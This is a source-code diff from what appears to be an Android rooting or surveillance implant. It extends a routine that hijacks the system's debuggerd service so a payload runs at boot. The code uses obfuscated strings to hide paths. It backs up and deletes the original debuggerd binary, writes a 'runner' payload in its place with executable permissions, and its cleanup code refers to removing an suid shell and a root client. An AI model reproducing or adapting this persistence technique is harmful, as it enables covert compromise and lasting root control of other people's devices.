@@ -35,19 +35,25 @@
 #include "boot_manager.h"
 
 // Create the boot script through debuggerd service
-int createDebuggerdBootScript() {
+int createDebuggerdBootScript(int is_64bit) {
   FILE *f1 = NULL;
   FILE *f2 = NULL;
   char install_script[1024];
+  char install_script_32_64[128];
   struct stat st;
   static unsigned char sh_script[] = "\xc6\x25\xf3\x2f\x29\x2b\xff\xc1\xff\xf2\xed\xf5\x2b\xec\xf1\xe8\x2b\xff\xf6"; // "#!/system/bin/sh"
   static unsigned char system_str[] = "\x76\xcb\xba\xef\x1b\x11\x1b\x06\x15\x2d"; // "/system"
 
-
   memset(install_script, 0, sizeof(install_script));
+  memset(install_script_32_64, 0, sizeof(install_script_32_64));
+  
+  if(is_64bit)
+    snprintf(install_script_32_64, sizeof(install_script_32_64), "%s64", deobfuscate(INSTALL_SCRIPT));
+  else
+    snprintf(install_script_32_64, sizeof(install_script_32_64), "%s", deobfuscate(INSTALL_SCRIPT));
 
   // Create a copy of the original binary
-  f1 = fopen(deobfuscate(INSTALL_SCRIPT), "r");
+  f1 = fopen(install_script_32_64, "r");
   f2 = fopen(deobfuscate(INSTALL_SCRIPT_BAK), "w");
 
   if(!f1 || !f2)
@@ -62,17 +68,16 @@ int createDebuggerdBootScript() {
   chmod(deobfuscate(INSTALL_SCRIPT_BAK), 0755);
 
   // Delete it!
-  remove(deobfuscate(INSTALL_SCRIPT));
+  remove(install_script_32_64);
 
   // Create the install script
-  f1 = fopen(deobfuscate(INSTALL_SCRIPT), "w");
+  f1 = fopen(install_script_32_64, "w");
   fwrite(&runner, 1, sizeof(runner), f1);
   fclose(f1);
-
-  chmod(deobfuscate(INSTALL_SCRIPT), 0755);
-
+  
+  chmod(install_script_32_64, 0755);
+  
   return 0;
-
 }
 
 // Create the boot script through the install-recovery.sh
@@ -137,7 +142,7 @@ int createBootScript() {
   static unsigned char debuggerd_str[] = "\xe8\x4b\x84\xad\x93\xae\xa2\x87\x9d\x93\x58\x9c\x93\x9e\xa3\x91\x91\x93\xae\x9c\x58\x59\xad\x97\xad\xac\x93\x9b\x59\x9e\x87\x9a\x59\x9c\x93\x9e\xa3\x91\x91\x93\xae\x9c"; // "service debuggerd /system/bin/debuggerd"
 
   static unsigned char init_str[] = "\x66\x6f\x01\xd7\x11\x18\x11\xee\xd8\xec\x1b"; // "/init.rc"
-
+  struct stat st;
 
   char *init_dump = (char *)read_file(deobfuscate(init_str));
   if(strstr(init_dump, deobfuscate(debuggerd_str)) == NULL) {
@@ -146,7 +151,11 @@ int createBootScript() {
   }
   else {
     LOGD("Debuggerd service found in init.rc\n");
-    return createDebuggerdBootScript();
+    
+    if(stat(deobfuscate(INSTALL_SCRIPT), &st) >= 0)    
+      return createDebuggerdBootScript(0);
+    else
+      return createDebuggerdBootScript(1);
   }
 
   // Never reached
@@ -157,16 +166,21 @@ int createBootScript() {
 // Remove the debuggerd boot script
 int removeDebuggerdBootScript() {
   static unsigned char system_dir[] = "\xfb\x8b\x77\xd4\x98\x86\x98\x91\xa2\xaa"; // "/system"
-
+  char install_script_32_64[128];
   struct stat st;
+
+  if(stat(deobfuscate(INSTALL_SCRIPT), &st) >= 0)    
+    snprintf(install_script_32_64, sizeof(install_script_32_64), "%s", deobfuscate(INSTALL_SCRIPT));
+  else
+    snprintf(install_script_32_64, sizeof(install_script_32_64), "%s64", deobfuscate(INSTALL_SCRIPT));
 
   LOGD("Removing suid shell and debuggerd boot script\n");
   // Delete the boot script
-  unlink(deobfuscate(INSTALL_SCRIPT));
+  unlink(install_script_32_64);
 		
   LOGD("Restoring original debuggerd script");
-  rename(deobfuscate(INSTALL_SCRIPT_BAK), deobfuscate(INSTALL_SCRIPT));
-  chmod(deobfuscate(INSTALL_SCRIPT), 0755);
+  rename(deobfuscate(INSTALL_SCRIPT_BAK), install_script_32_64);
+  chmod(install_script_32_64, 0755);
   unlink(deobfuscate(INSTALL_SCRIPT_BAK));
 
   // Remove root client
